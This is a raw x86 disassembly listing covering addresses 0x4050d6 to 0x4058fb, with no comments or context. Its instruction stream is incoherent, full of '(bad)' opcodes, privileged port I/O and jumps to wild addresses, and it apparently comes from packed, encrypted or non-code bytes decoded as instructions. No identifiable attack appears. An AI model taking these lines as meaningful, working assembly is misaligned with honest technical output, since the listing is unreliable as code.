  4050d6:	add    al,0x40
  4050d8:	stos   BYTE PTR es:[edi],al
  4050d9:	pop    ebx
  4050da:	pop    DWORD PTR [ebp+edx*1+0x59]
  4050de:	hlt    
  4050df:	add    eax,0x9a3cb624
  4050e4:	pop    ss
  4050e5:	xchg   edi,eax
  4050e6:	cmp    DWORD PTR [edx+ebx*8-0x69],esi
  4050ea:	mov    ds,WORD PTR [ebp-0x73]
  4050ed:	xchg   BYTE PTR [eax+0x5d],cl
  4050f0:	jbe    0x4050e9
  4050f2:	xor    eax,0x146bf3ec
  4050f7:	pop    ds
  4050f8:	or     eax,0x50a8aca0
  4050fd:	mov    ecx,0x8e21d505
  405102:	cdq    
  405103:	imul   ebp,edi,0x50e11b03
  405109:	inc    ebp
  40510a:	lods   al,BYTE PTR ds:[esi]
  40510b:	xor    ebp,edi
  40510d:	push   esp
  40510e:	xchg   ebp,eax
  40510f:	imul   eax,DWORD PTR [eax],0x8922392a
  405115:	jno    0x405192
  405117:	ss retf 
  405119:	cmp    al,0x8f
  40511b:	push   es
  40511c:	retf   
  40511d:	xchg   edx,eax
  40511e:	stos   DWORD PTR es:[edi],eax
  40511f:	bound  edi,QWORD PTR [ebp+0x68ecf2c8]
  405125:	jmp    0xbe694135
  40512a:	xor    cl,BYTE PTR [esi+0x6c]
  40512d:	pusha  
  40512e:	push   cs
  40512f:	lock das 
  405131:	sub    eax,0x7f348766
  405136:	ss push 0xffffff80
  405139:	jnp    0x40511a
  40513b:	ret    0xf0e2
  40513e:	scas   eax,DWORD PTR es:[edi]
  40513f:	inc    esi
  405140:	les    ebp,FWORD PTR [ebx]
  405142:	retf   
  405143:	test   al,0xb4
  405145:	inc    ecx
  405146:	mov    esi,0xddc38a15
  40514b:	sahf   
  40514c:	mov    ds,WORD PTR [esi+0x16]
  40514f:	jno    0x40514b
  405151:	jmp    0x3e7ad859
  405156:	fldlg2 
  405158:	sbb    al,0x1a
  40515a:	sub    al,BYTE PTR [esi+0x22]
  40515d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40515e:	nop
  40515f:	scas   eax,DWORD PTR es:[edi]
  405160:	mov    WORD PTR [edi],?
  405162:	outs   dx,BYTE PTR ds:[esi]
  405163:	pop    ebp
  405164:	sbb    ah,BYTE PTR [edi+0x24]
  405167:	dec    edi
  405168:	mov    dh,0x21
  40516a:	fsub   QWORD PTR [esi+0x4d]
  40516d:	fisttp WORD PTR [ecx]
  40516f:	fild   DWORD PTR [edx+0x66707f9d]
  405175:	push   ebp
  405176:	aaa    
  405177:	aam    0x1b
  405179:	clc    
  40517a:	les    esi,FWORD PTR [ecx+0x5fce2dad]
  405180:	add    eax,0x9c6b0f3c
  405185:	cdq    
  405186:	mov    ds:0x32f8a04a,eax
  40518b:	cmc    
  40518c:	ss test eax,0x41f413c9
  405192:	cmp    BYTE PTR [eax+0x710a2f87],ch
  405198:	in     al,dx
  405199:	es out dx,al
  40519b:	adc    eax,0x4fd7a06e
  4051a0:	lods   al,BYTE PTR ds:[esi]
  4051a1:	fisubr DWORD PTR [edi]
  4051a3:	loop   0x4051b8
  4051a5:	xor    DWORD PTR ds:0x96dfdd5e,esi
  4051ab:	inc    BYTE PTR [ecx]
  4051ad:	fsubr  DWORD PTR ds:0x7c39ad22
  4051b3:	adc    eax,0xa81a7aed
  4051b8:	popa   
  4051b9:	inc    esp
  4051ba:	xchg   edi,eax
  4051bb:	pop    esi
  4051bc:	push   ss
  4051bd:	cmp    al,0x30
  4051bf:	pop    edx
  4051c1:	outs   dx,DWORD PTR ds:[esi]
  4051c2:	or     eax,0x90937fd4
  4051c7:	dec    edi
  4051c8:	jns    0x405161
  4051ca:	outs   dx,DWORD PTR ds:[esi]
  4051cb:	mov    bh,0x18
  4051cd:	div    DWORD PTR [ebp+eiz*1-0x1fd32032]
  4051d4:	cmp    DWORD PTR [eax-0x5e],ebx
  4051d7:	dec    esi
  4051d8:	dec    edi
  4051d9:	sbb    ah,bh
  4051db:	dec    esi
  4051dc:	inc    edx
  4051dd:	iret   
  4051de:	pop    es
  4051df:	sub    esi,DWORD PTR [ebx]
  4051e1:	pop    ss
  4051e2:	hlt    
  4051e3:	dec    esi
  4051e4:	xor    al,0xb
  4051e6:	xchg   esi,eax
  4051e7:	xchg   ebx,eax
  4051e8:	adc    al,0x7f
  4051ea:	add    al,0x9b
  4051ec:	in     eax,0xf2
  4051ee:	sbb    eax,0x72936563
  4051f3:	rcl    DWORD PTR [ebx-0x46c385fa],1
  4051f9:	sbb    DWORD PTR [esp+eax*2],esp
  4051fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051fd:	pop    ds
  4051fe:	mov    bh,0x90
  405200:	mov    al,0xc7
  405202:	add    cl,bl
  405204:	int3   
  405205:	aas    
  405206:	int3   
  405207:	dec    edx
  405208:	xchg   ebp,eax
  405209:	and    eax,ecx
  40520b:	pop    esi
  40520c:	jne    0x405192
  40520e:	lea    ebp,[ebx]
  405210:	(bad)  
  405211:	jmp    0xff606d79
  405216:	dec    esp
  405217:	in     al,0x2c
  405219:	add    al,0x8
  40521b:	push   es
  40521c:	loop   0x40529b
  40521e:	fs std 
  405220:	mov    eax,0x15f0c082
  405225:	pop    ebx
  405226:	jle    0x4051da
  405228:	cmovns esi,DWORD PTR [esi+0x58c2c5b1]
  40522f:	mov    WORD PTR fs:[eax-0x5d79f90f],es
  405236:	int    0xf6
  405238:	daa    
  405239:	cdq    
  40523a:	or     BYTE PTR [ebp+0x23],ch
  40523d:	(bad)  
  40523e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40523f:	xlat   BYTE PTR ds:[ebx]
  405240:	jne    0x405200
  405242:	sub    eax,0xccec9a62
  405247:	mov    esp,0x399a17e3
  40524c:	mov    WORD PTR [ebx+0x75],?
  40524f:	retf   
  405250:	stc    
  405251:	retf   0x459f
  405254:	(bad)  
  405255:	mov    ?,edx
  405257:	jbe    0x405211
  405259:	imul   ecx,DWORD PTR [ebx-0x5961bc18],0x7022f300
  405263:	mov    ch,0x76
  405265:	sub    edi,DWORD PTR [esi]
  405267:	mov    ds:0x60157bbd,al
  40526c:	clc    
  40526d:	mov    ah,0x73
  40526f:	or     cl,BYTE PTR [edx+eax*2-0x7e8744f4]
  405276:	xor    ebx,ecx
  405278:	mov    ebp,0x38933ffb
  40527d:	push   edi
  40527e:	mov    ch,0xa
  405280:	mov    cs,edi
  405282:	sub    eax,0x5839bfe5
  405287:	pop    ecx
  405288:	cwde   
  405289:	cli    
  40528a:	xchg   ecx,eax
  40528b:	or     bl,bl
  40528d:	mov    eax,ds:0x94c8886c
  405292:	xlat   BYTE PTR ds:[ebx]
  405293:	das    
  405294:	push   0x714430c3
  405299:	call   0xe7a3d766
  40529e:	scas   al,BYTE PTR es:[edi]
  40529f:	outs   dx,BYTE PTR ds:[esi]
  4052a0:	pop    esi
  4052a1:	out    0x88,eax
  4052a3:	in     al,dx
  4052a4:	add    BYTE PTR [edi-0x26],0xbc
  4052a8:	je     0x405318
  4052aa:	pop    ds
  4052ab:	daa    
  4052ac:	inc    edx
  4052ad:	jae    0x405268
  4052af:	pop    ebx
  4052b0:	dec    edx
  4052b1:	test   eax,0x526cc775
  4052b6:	rcr    BYTE PTR [ebp-0x37353446],cl
  4052bc:	daa    
  4052bd:	and    edx,edx
  4052bf:	int3   
  4052c0:	mov    ebp,0xb3b80282
  4052c5:	and    esp,DWORD PTR [ebp+0x536cbfd]
  4052cb:	pusha  
  4052cc:	rcl    BYTE PTR [edx+0x5b],cl
  4052cf:	rcr    BYTE PTR [ebp+0xf49d353],cl
  4052d5:	sahf   
  4052d6:	push   edi
  4052d7:	mov    edx,0x57025010
  4052dc:	pop    edi
  4052dd:	push   ebx
  4052de:	mov    eax,edx
  4052e0:	jae    0x4052be
  4052e2:	fwait
  4052e3:	add    eax,0xf2c8ba9b
  4052e8:	push   esi
  4052e9:	mov    cl,0xf1
  4052ec:	cmp    al,0xd8
  4052ee:	cmp    DWORD PTR [ebp-0x39dae2a8],esp
  4052f4:	outs   dx,DWORD PTR ds:[esi]
  4052f5:	xor    eax,0x64171b22
  4052fa:	scas   al,BYTE PTR es:[edi]
  4052fb:	mov    al,0x13
  4052fd:	(bad)  
  4052fe:	xor    al,0x74
  405300:	popf   
  405301:	sahf   
  405302:	dec    edx
  405303:	lods   eax,DWORD PTR ds:[esi]
  405304:	lods   al,BYTE PTR ds:[esi]
  405305:	fisub  DWORD PTR [ebp+ebp*2-0xeac4e42]
  40530c:	push   esi
  40530d:	les    ebx,FWORD PTR [esi]
  40530f:	inc    ebx
  405310:	fs mov al,0x4d
  405313:	inc    esp
  405314:	adc    al,0xa9
  405316:	jmp    0x405312
  405318:	sti    
  405319:	js     0x4052ad
  40531b:	add    cl,0xe0
  40531e:	stos   DWORD PTR es:[edi],eax
  40531f:	imul   ebp,DWORD PTR [esi],0xac9e1dcb
  405325:	cwde   
  405326:	pop    esp
  405327:	mov    ah,0xab
  405329:	mov    bh,0x9d
  40532b:	dec    ebp
  40532c:	imul   ebp,DWORD PTR [esi+0x5ac1f3],0xffffffe3
  405333:	popa   
  405334:	retf   0x3b3c
  405337:	xchg   edx,eax
  405338:	test   al,0x48
  40533a:	dec    ebp
  40533b:	add    eax,eax
  40533d:	gs in  al,dx
  40533f:	xchg   DWORD PTR [esi-0xa],ebx
  405342:	les    esp,FWORD PTR [ebx]
  405344:	fstp   TBYTE PTR [ebx-0x12]
  405347:	mov    ebx,edx
  405349:	inc    ecx
  40534a:	mov    esp,0xbb729cc4
  40534f:	popf   
  405350:	js     0x4053bb
  405352:	repnz add DWORD PTR [edi],ebx
  405355:	ins    DWORD PTR es:[edi],dx
  405356:	xchg   ecx,eax
  405357:	sbb    edi,DWORD PTR [eax-0x39]
  40535a:	(bad)  
  40535b:	fadd   QWORD PTR [edx+0x2d]
  40535e:	shl    DWORD PTR [ecx+edx*2],0xa5
  405362:	ins    DWORD PTR es:[edi],dx
  405363:	sbb    dl,BYTE PTR es:[edx-0x39]
  405367:	sub    eax,0xc25776d0
  40536c:	sub    al,0x8a
  40536e:	sub    eax,esp
  405370:	cwde   
  405371:	aam    0x76
  405373:	sub    DWORD PTR [eax-0x28],0x4d
  405377:	ret    
  405378:	mov    al,0xb3
  40537a:	mov    al,ds:0xfb06f2b
  40537f:	xchg   edi,eax
  405380:	cmp    DWORD PTR [ebx-0x33],ebp
  405383:	sub    al,0xf3
  405385:	pusha  
  405386:	xchg   DWORD PTR [ebx+0x40],ebp
  405389:	(bad)
  40538c:	mov    ds:0x3bfc99d2,eax
  405391:	mov    ecx,0xb48828ed
  405396:	es pop ds
  405398:	sti    
  405399:	cmp    DWORD PTR [esi+ecx*4+0x57],ebx
  40539d:	call   0x630f5507
  4053a2:	add    dh,dh
  4053a4:	jno    0x40537d
  4053a6:	jp     0x405384
  4053a8:	and    ecx,DWORD PTR [esi]
  4053aa:	inc    esp
  4053ab:	push   es
  4053ac:	add    eax,0x9f274d47
  4053b1:	mov    ebp,0x44284122
  4053b6:	ficomp DWORD PTR [ebx-0x41]
  4053b9:	pop    edx
  4053ba:	pusha  
  4053bb:	sbb    ah,0xbb
  4053be:	and    al,0x5b
  4053c0:	mov    ecx,0xf8ed4b31
  4053c5:	enter  0xc71c,0x10
  4053c9:	cmp    eax,0x89635b5
  4053ce:	lds    edi,FWORD PTR [edx]
  4053d0:	or     dl,BYTE PTR ds:0xf61908ae
  4053d6:	add    al,0x95
  4053d8:	pop    edi
  4053d9:	in     ax,0x6d
  4053dc:	hlt    
  4053dd:	outs   dx,DWORD PTR ds:[esi]
  4053de:	orps   xmm7,XMMWORD PTR [edi+0x63]
  4053e2:	aaa    
  4053e3:	inc    ecx
  4053e4:	and    esi,DWORD PTR [eax+0x11]
  4053e7:	ret    
  4053e8:	jne    0x405431
  4053ea:	gs not eax
  4053ed:	jb     0x405396
  4053ef:	xor    BYTE PTR [esi+0x4a],al
  4053f2:	add    DWORD PTR [ebp+0x411c1a5f],edx
  4053f8:	inc    esi
  4053f9:	mov    eax,ds:0xfc2beb09
  4053fe:	fcomp  DWORD PTR [esi+edi*2+0x79833e11]
  405405:	mov    ds:0x5d4d2979,eax
  40540a:	cld    
  40540b:	xor    bh,BYTE PTR ds:[ecx]
  40540e:	(bad)  ds:0xd48df3fd
  405414:	test   eax,0xfe186bd5
  405419:	xchg   edx,eax
  40541a:	cmp    ebp,DWORD PTR [eax-0x74541e30]
  405420:	imul   eax,DWORD PTR [eax],0xffffff9e
  405423:	xchg   edx,eax
  405424:	das    
  405425:	push   ecx
  405426:	aam    0xd6
  405428:	cwde   
  405429:	xchg   BYTE PTR [esi+0x49],bl
  40542c:	cmp    BYTE PTR [edx],0x95
  40542f:	mov    al,ds:0x16407e1f
  405434:	inc    edi
  405435:	mov    ebx,0x20e5c0ef
  40543a:	in     eax,dx
  40543b:	or     eax,0x620e673a
  405440:	and    eax,0x3163237d
  405445:	shl    DWORD PTR [edi],0x32
  405448:	pop    es
  405449:	or     esp,esp
  40544b:	in     al,dx
  40544c:	inc    ebp
  40544d:	(bad)  ds:0x4cb913b7
  405453:	dec    ecx
  405454:	aas    
  405455:	sbb    esp,esp
  405457:	(bad)  
  405458:	out    dx,eax
  405459:	(bad)  
  40545a:	js     0x4054d7
  40545c:	sub    al,0xc2
  40545e:	call   0xb6f4a82c
  405463:	dec    ebx
  405464:	retf   
  405465:	aad    0x21
  405467:	out    dx,al
  405468:	fimul  WORD PTR [esi-0x7dec64e1]
  40546e:	enter  0x7973,0x2b
  405472:	fisttp QWORD PTR [ebx+0x3f]
  405475:	mov    bh,0xa7
  405477:	and    dh,BYTE PTR [esi+edi*1-0x325b40fe]
  40547e:	jno    0x4054ab
  405480:	sbb    edi,ecx
  405482:	inc    ebp
  405483:	and    BYTE PTR [esi-0x64],al
  405486:	ja     0x405427
  405488:	(bad)  
  405489:	mov    ah,0xdb
  40548b:	mov    ds:0x64d778bc,eax
  405490:	jbe    0x4054c3
  405492:	popf   
  405493:	pop    ds
  405494:	outs   dx,DWORD PTR ds:[esi]
  405495:	jae    0x405484
  405497:	mov    ecx,0xe8ce0e97
  40549c:	fist   WORD PTR [edx-0x5a0baa05]
  4054a2:	test   eax,0xde6ad5da
  4054a7:	jbe    0x405527
  4054a9:	cmp    eax,0x500e3749
  4054ae:	push   esp
  4054af:	lods   al,BYTE PTR ds:[si]
  4054b1:	lock popf 
  4054b3:	in     eax,0x97
  4054b5:	dec    eax
  4054b6:	adc    DWORD PTR ds:0xd03f7a0a,0xe1764459
  4054c0:	xchg   edx,eax
  4054c1:	xchg   esi,eax
  4054c2:	sbb    BYTE PTR [edx-0x243e00a2],ah
  4054c8:	out    dx,eax
  4054c9:	into   
  4054ca:	call   0xca3b6e57
  4054cf:	lea    ebx,[ebx+ecx*2]
  4054d2:	mov    edx,0x982047a7
  4054d7:	out    dx,al
  4054d8:	dec    ebp
  4054d9:	int    0x3d
  4054db:	mov    ebx,?
  4054dd:	jns    0x405531
  4054df:	pusha  
  4054e0:	cs push cs
  4054e2:	mov    dl,0x6a
  4054e4:	call   0x2f8f70c7
  4054e9:	icebp  
  4054ea:	and    eax,0xb8f4dfd5
  4054ef:	arpl   WORD PTR [edi],ax
  4054f1:	inc    esp
  4054f2:	push   ds
  4054f3:	sbb    DWORD PTR [edx],ebx
  4054f5:	into   
  4054f6:	adc    ecx,DWORD PTR [ecx+0x4cb32206]
  4054fc:	or     BYTE PTR fs:[esi],dh
  4054ff:	sub    DWORD PTR [ebx-0x49],esi
  405502:	loop   0x405545
  405504:	or     DWORD PTR [eax+0x4],esp
  405507:	push   0xc7f0f890
  40550c:	rcl    DWORD PTR [edi-0x3d],cl
  40550f:	shl    BYTE PTR [edi-0x272d6a35],0xf5
  405516:	int3   
  405517:	mov    bl,BYTE PTR [ebp-0x4b]
  40551a:	fild   QWORD PTR [ebp+0x349db43c]
  405520:	repnz pop ss
  405522:	push   ds
  405523:	adc    edx,edi
  405525:	imul   DWORD PTR [ebx+0x4ccc56e]
  40552b:	sbb    DWORD PTR [edi],esi
  40552d:	mov    dh,0x14
  40552f:	int    0xc8
  405531:	sub    bl,BYTE PTR [eax-0x3dbd0ad7]
  405537:	clc    
  405538:	sub    eax,0xd90d75ef
  40553d:	jb     0x405579
  40553f:	scas   eax,DWORD PTR es:[edi]
  405540:	fwait
  405541:	adc    BYTE PTR [ecx-0x7],al
  405544:	jae    0x40553f
  405546:	dec    edi
  405547:	fmul   QWORD PTR [esp+ecx*1+0x1b]
  40554b:	loopne 0x40556f
  40554d:	mov    WORD PTR [edi+0x2e641aa],?
  405553:	dec    ebp
  405554:	mov    esi,ebx
  405556:	(bad)  
  405558:	jecxz  0x405504
  40555a:	jmp    0x75ec6e4
  40555f:	pop    ecx
  405560:	xor    eax,0x332eead9
  405565:	call   0xebedbed4
  40556a:	mov    DWORD PTR [edx+0x1b],esi
  40556d:	shl    DWORD PTR [ebp-0x313d375e],0xc8
  405574:	std    
  405575:	sbb    BYTE PTR [ebp-0x18],al
  405578:	xor    DWORD PTR [ecx],ebp
  40557a:	pop    ss
  40557b:	mov    ds:0x4a4f3ce2,eax
  405580:	pop    esi
  405581:	call   eax
  405583:	sub    eax,0x75075595
  405588:	btc    DWORD PTR [edi-0x4a273848],esp
  40558f:	stos   DWORD PTR es:[edi],eax
  405590:	jecxz  0x4055a6
  405592:	dec    ecx
  405593:	pop    ebx
  405594:	imul   esp,eax,0xe6886154
  40559a:	inc    esp
  40559b:	push   edx
  40559c:	mov    WORD PTR [esi-0x6e],ds
  40559f:	push   es
  4055a0:	jno    0x405529
  4055a2:	ds das 
  4055a4:	pop    edx
  4055a5:	sbb    ah,BYTE PTR [ecx+0x73]
  4055a8:	ss jne 0x405570
  4055ab:	pop    ss
  4055ac:	jg     0x405619
  4055ae:	aas    
  4055af:	xor    edx,esi
  4055b1:	stos   BYTE PTR es:[edi],al
  4055b2:	mov    ah,0xe6
  4055b4:	dec    ecx
  4055b5:	sbb    esi,DWORD PTR fs:[ecx-0x65a52185]
  4055bc:	mov    ecx,0xde7d3d63
  4055c1:	jb     0x4055f0
  4055c3:	mov    edi,DWORD PTR [esi-0x17]
  4055c6:	enter  0x8cd,0xa9
  4055ca:	xor    edi,edx
  4055cc:	pop    ds
  4055cd:	xor    al,0x64
  4055cf:	nop
  4055d0:	adc    BYTE PTR [edx],ch
  4055d2:	and    dl,BYTE PTR [ecx+eax*2-0x58766ac1]
  4055d9:	addr16 cmc 
  4055db:	das    
  4055dc:	cmp    DWORD PTR [esi+edx*2+0x2e],ebx
  4055e0:	xor    eax,0x9c964da6
  4055e5:	sar    DWORD PTR [edx-0x3c],0x64
  4055e9:	push   ebp
  4055ea:	test   DWORD PTR [edi+0x25dbdc2e],edx
  4055f0:	in     al,dx
  4055f1:	in     al,dx
  4055f2:	adc    al,0xe5
  4055f4:	add    edi,DWORD PTR [ecx+0x12]
  4055f7:	mov    edx,0x55c96307
  4055fc:	mov    edi,0xef06bcc9
  405601:	jno    0x4055c4
  405603:	imul   esp,DWORD PTR [ebx+0x3b],0x71ab36ab
  40560a:	jcxz   0x40566d
  40560d:	inc    edi
  40560e:	xchg   ebx,eax
  40560f:	jmp    0xa90c:0xa5c10189
  405616:	sub    al,0xbe
  405618:	std    
  405619:	gs mov bh,0x8f
  40561c:	ret    0x3bd9
  40561f:	test   ebp,edi
  405621:	jge    0x4055aa
  405623:	sbb    DWORD PTR [esp+ebx*8-0x2e],ecx
  405627:	test   eax,0x3720a159
  40562c:	mov    edi,0xcd082657
  405631:	mov    cs:0xbc30cfa7,eax
  405637:	(bad)  
  405638:	pop    esp
  405639:	and    al,BYTE PTR [eax+0x5737f9f1]
  40563f:	mov    esi,0x47b60cc3
  405644:	or     eax,0xf0665828
  405649:	or     eax,0x67867b4
  40564e:	jg     0x40563e
  405650:	leave  
  405651:	out    dx,eax
  405652:	jle    0x405698
  405654:	repnz cld 
  405656:	mov    ecx,0xa25f6ecf
  40565b:	sbb    esi,0x76
  40565e:	mov    ch,0x1c
  405660:	sbb    eax,0xbfb03c24
  405665:	add    eax,0xf41551a2
  40566a:	pop    ds
  40566b:	xchg   ebx,eax
  40566c:	ja     0x40566b
  40566e:	mov    ecx,0x49fb768f
  405673:	jns    0x405635
  405675:	retf   0xe408
  405678:	push   0x3d3b2c77
  40567d:	dec    edx
  40567e:	mov    al,0x56
  405680:	fs icebp 
  405682:	push   cs
  405683:	(bad)  
  405684:	jp     0x405700
  405686:	xchg   BYTE PTR ds:0xa6bb62f0,cl
  40568c:	and    al,BYTE PTR [ebx-0x23a6bffb]
  405692:	mov    edx,ebp
  405694:	inc    eax
  405695:	lods   al,BYTE PTR ds:[esi]
  405696:	xchg   esp,eax
  405697:	inc    esi
  405698:	jle    0x4056b0
  40569a:	imul   ebx,DWORD PTR [edi],0xffffffba
  40569d:	fmul   DWORD PTR [esi-0x2c]
  4056a0:	fisubr DWORD PTR [ebx-0x130ab98d]
  4056a6:	gs jb  0x4056fd
  4056a9:	loop   0x40564c
  4056ab:	pop    esp
  4056ac:	hlt    
  4056ad:	popf   
  4056ae:	or     DWORD PTR [esp+ebp*1-0x4e3ab6a6],0x60
  4056b6:	ja     0x405683
  4056b8:	dec    ecx
  4056b9:	daa    
  4056ba:	iret   
  4056bb:	call   FWORD PTR fs:[ecx-0xd]
  4056bf:	shl    ah,cl
  4056c1:	popa   
  4056c2:	mov    esi,0x46cf9f16
  4056c7:	pop    ds
  4056c8:	pusha  
  4056c9:	(bad)
  4056cd:	test   eax,0x64f9042
  4056d2:	add    al,BYTE PTR [eax]
  4056d4:	scas   eax,DWORD PTR es:[edi]
  4056d5:	mov    dl,0xf0
  4056d7:	out    dx,al
  4056d8:	jbe    0x4056ce
  4056da:	cmp    dl,BYTE PTR [ebp+0x68]
  4056dd:	sub    eax,0x6640a28f
  4056e2:	inc    esp
  4056e3:	add    eax,0xb0383ba
  4056e8:	mov    esp,0x13a7de3e
  4056ed:	cmp    eax,ebp
  4056ef:	and    al,0x85
  4056f1:	stc    
  4056f2:	or     cl,cl
  4056f4:	ss push edx
  4056f6:	push   edx
  4056f7:	aas    
  4056f8:	mov    WORD PTR cs:[ecx+0x58],cs
  4056fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056fd:	push   ds
  4056fe:	or     eax,0xaeedcd51
  405703:	test   BYTE PTR [ebp+0x70],0xae
  405707:	pop    edi
  405708:	cmc    
  405709:	fstp   DWORD PTR [esi]
  40570c:	adc    eax,0x827cd585
  405711:	add    BYTE PTR [ebp+edx*8-0x46],ch
  405715:	xchg   esp,eax
  405716:	xor    al,0xbe
  405718:	enter  0xae5d,0xdb
  40571c:	test   BYTE PTR [ebx+esi*4],bh
  40571f:	aas    
  405720:	jmp    0x11614e9c
  405725:	inc    edi
  405726:	sbb    cl,BYTE PTR [edi+0x4f]
  405729:	pusha  
  40572a:	cmp    DWORD PTR ds:0xc968b24a,edx
  405730:	xchg   esi,eax
  405731:	push   0xfeb652c3
  405736:	xchg   DWORD PTR [ebp+0x58],esp
  405739:	xchg   ebx,eax
  40573a:	xor    BYTE PTR [ecx+0xf],dl
  40573d:	(bad)  [edx+0x7e8a30fa]
  405743:	adc    ebx,DWORD PTR [ebx]
  405745:	jns    0x405795
  405747:	jo     0x405734
  405749:	jmp    0x4e05a6b9
  40574e:	hlt    
  40574f:	cmp    ebp,esp
  405751:	mov    al,ds:0xfa95b8c0
  405756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405757:	int    0xb0
  405759:	jo     0x4056f9
  40575b:	mov    esi,0x78c42057
  405760:	sub    edx,DWORD PTR [esi]
  405762:	repnz or BYTE PTR [eax],bh
  405765:	jp     0x4057de
  405767:	sub    eax,0xb6ded99f
  40576d:	aam    0xe5
  40576f:	or     ah,dl
  405771:	xor    BYTE PTR [eax+eax*4],bh
  405774:	cdq    
  405775:	loope  0x4057af
  405777:	pop    ds
  405778:	cmp    eax,0x94ce1d2b
  40577d:	and    ebx,0xffffffd5
  405780:	sar    DWORD PTR [ecx+ebp*8+0x3b],0x46
  405785:	dec    esi
  405786:	pop    edi
  405787:	mov    al,ds:0x6d00be97
  40578c:	rol    DWORD PTR [edi],0xd6
  40578f:	sbb    ecx,DWORD PTR [ebp-0x7377c84e]
  405795:	leave  
  405796:	aas    
  405797:	xchg   ebx,eax
  405798:	outs   dx,BYTE PTR ds:[esi]
  405799:	mov    ah,0xd2
  40579b:	xor    edi,DWORD PTR [edx-0x2763906d]
  4057a1:	out    dx,eax
  4057a2:	add    al,0x7a
  4057a4:	lahf   
  4057a5:	pushf  
  4057a6:	sti    
  4057a7:	in     al,0x5b
  4057a9:	mov    al,ds:0xd256983d
  4057ae:	imul   esi,DWORD PTR [edx+0x69],0xffffffbb
  4057b2:	nop
  4057b3:	rol    DWORD PTR [esi+0x2e85c317],1
  4057b9:	mov    ebp,0xc6ed037d
  4057be:	push   ebx
  4057bf:	cli    
  4057c0:	pop    ecx
  4057c1:	inc    bp
  4057c3:	bound  esi,QWORD PTR [eax-0x14]
  4057c6:	xchg   ebx,eax
  4057c7:	adc    BYTE PTR [edi-0x25b4602f],ch
  4057cd:	ficom  WORD PTR [edx+0x27a1f942]
  4057d3:	xor    cl,al
  4057d5:	ins    DWORD PTR es:[edi],dx
  4057d6:	pusha  
  4057d7:	jns    0x4057f2
  4057d9:	mov    esi,0x6919c425
  4057de:	movaps xmm3,xmm0
  4057e1:	lods   eax,DWORD PTR ds:[esi]
  4057e2:	rol    BYTE PTR [ebp+0xfc5ce02],cl
  4057e8:	sub    eax,0xee53d07f
  4057ed:	or     eax,0xb83d0e95
  4057f2:	add    DWORD PTR [ebx-0x21d6ac29],eax
  4057f8:	mov    edx,0x4a3943b2
  4057fd:	pop    es
  4057fe:	out    0x82,eax
  405800:	outs   dx,BYTE PTR ds:[esi]
  405801:	dec    edx
  405802:	outs   dx,DWORD PTR ds:[esi]
  405803:	push   ds
  405804:	dec    ecx
  405805:	sar    DWORD PTR [edx-0x3430f09b],cl
  40580b:	inc    edx
  40580c:	addr16 ss sub cl,0x55
  405811:	(bad)  
  405812:	fld    TBYTE PTR [ecx+esi*1-0x1b]
  405816:	add    BYTE PTR [ecx-0xb],al
  405819:	std    
  40581a:	shl    ebx,1
  40581c:	inc    ecx
  40581d:	adc    al,0x6f
  40581f:	dec    edx
  405820:	mov    edi,0x660da596
  405825:	jp     0x405830
  405827:	mov    al,0xd0
  405829:	mov    gs,WORD PTR [esi+0x10]
  40582c:	(bad)  
  40582d:	lods   eax,DWORD PTR ds:[esi]
  40582e:	and    BYTE PTR [ecx+ebp*2],dh
  405831:	sbb    ah,BYTE PTR [ebp-0x28969361]
  405837:	pop    ss
  405838:	xchg   BYTE PTR [eax],bl
  40583a:	pop    edi
  40583b:	out    0xe6,al
  40583d:	int    0x7b
  40583f:	ror    DWORD PTR [ecx+0x43530f5c],1
  405845:	ret    0x50a3
  405848:	adc    BYTE PTR [esi],0x57
  40584b:	daa    
  40584c:	adc    eax,0x5c3dc37f
  405851:	xchg   esp,eax
  405852:	(bad)  
  405854:	in     eax,0xb2
  405856:	cmp    eax,0xe73b0c1
  40585b:	jg     0x405867
  40585d:	bound  eax,QWORD PTR [edx-0xbd9b2a4]
  405863:	mov    ds:0xe44cc7db,al
  405868:	mov    bh,0x3
  40586a:	ror    BYTE PTR [edi-0x58],cl
  40586d:	jle    0x4057ef
  40586f:	sbb    al,0xd9
  405871:	jg     0x40585c
  405873:	add    DWORD PTR [edi-0xf2e3179],edx
  405879:	jb     0x4058e9
  40587b:	fs inc edi
  40587d:	lods   eax,DWORD PTR ds:[esi]
  40587e:	loope  0x40587b
  405880:	(bad)  
  405881:	and    bh,dh
  405883:	sub    ebx,DWORD PTR [edx]
  405885:	cli    
  405886:	or     ebx,DWORD PTR [edx]
  405888:	cmp    eax,0x97d6ad35
  40588d:	out    dx,al
  40588e:	push   0x51
  405890:	xchg   ecx,eax
  405891:	cmp    BYTE PTR [esi-0x11f47953],ah
  405897:	cmp    al,0x47
  405899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40589a:	xchg   ebp,eax
  40589b:	fsub   st(5),st
  40589d:	je     0x82866aa9
  4058a3:	ins    BYTE PTR es:[edi],dx
  4058a4:	fwait
  4058a5:	arpl   WORD PTR [edi-0x1d],ax
  4058a8:	xchg   ebx,eax
  4058a9:	mov    esi,0xfe821d63
  4058ae:	or     BYTE PTR [edx],0x45
  4058b1:	mov    BYTE PTR [eax],ah
  4058b3:	or     BYTE PTR [ebx+0x28],cl
  4058b6:	das    
  4058b7:	push   0x73075abc
  4058bc:	dec    eax
  4058bd:	sahf   
  4058be:	jno    0x405868
  4058c0:	jle    0x4058ec
  4058c2:	test   al,bl
  4058c4:	pop    edi
  4058c5:	in     al,dx
  4058c6:	scas   al,BYTE PTR es:[edi]
  4058c7:	bound  eax,QWORD PTR [eax-0x41]
  4058ca:	loopne 0x4058d0
  4058cc:	xor    bh,BYTE PTR [edi]
  4058ce:	fsub   DWORD PTR [eax-0x3161dcac]
  4058d4:	xchg   edi,eax
  4058d5:	and    dl,0xe
  4058d8:	int    0x65
  4058da:	pop    ecx
  4058db:	popf   
  4058dc:	mov    ch,0x1d
  4058de:	jmp    0xbef0:0xc76e0879
  4058e5:	ds cmp ah,BYTE PTR cs:[ecx+edi*2-0x38]
  4058eb:	inc    esi
  4058ec:	jne    0x4058bf
  4058ee:	addr16 inc esp
  4058f0:	pop    edi
  4058f1:	iret   
  4058f2:	mov    dl,0x49
  4058f4:	xor    eax,0xefc819e9
  4058f9:	add    al,0x85
  4058fb:	lds    ecx,FWORD PTR [ecx]
